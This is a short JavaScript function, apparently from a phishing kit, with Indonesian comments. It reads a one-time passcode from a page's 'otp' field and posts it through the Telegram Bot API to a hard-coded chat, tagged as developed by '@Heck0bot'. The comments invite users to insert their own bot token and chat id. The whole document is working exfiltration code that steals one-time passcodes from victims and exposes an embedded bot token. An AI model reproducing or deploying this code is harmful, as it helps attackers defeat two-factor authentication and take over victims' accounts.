function kirimP() {

    var otp = document.getElementById('otp');

    //var gabungan = 'Email : '  + email.value + '%0APhone Number' + number.value;

    var token = '6580655277:AAHYm3Y5tO3dHgAEwPq9nuI1l0xW5LJx60Y'; // Ganti dengan token bot yang kamu buat
    var grup = '6410517472'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${'ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @Heck0bot%0A%0AOTP : ' +otp.value}&parse_mode=html`,
        method: `POST`,
    })
}
